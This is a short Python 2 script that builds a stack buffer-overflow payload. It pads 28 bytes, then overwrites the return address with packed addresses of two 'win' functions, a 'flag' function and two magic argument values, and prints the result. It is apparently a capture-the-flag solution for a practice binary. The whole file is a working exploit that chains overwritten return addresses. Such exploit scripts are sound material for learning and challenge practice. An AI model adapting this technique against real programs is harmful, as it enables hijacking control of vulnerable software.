import struct

win_function1 = 0x080485cb
win_function2 = 0x080485d8

arg1 = 0xBAAAAAAD
arg2 = 0xDEADBAAD

flag = 0x0804862b

payload = ""
payload += 'A'*28
payload += struct.pack('I', win_function1)
payload += struct.pack('I', win_function2)
payload += struct.pack('I', flag)
payload += struct.pack('I', arg1)
payload += struct.pack('I', arg2)

print payload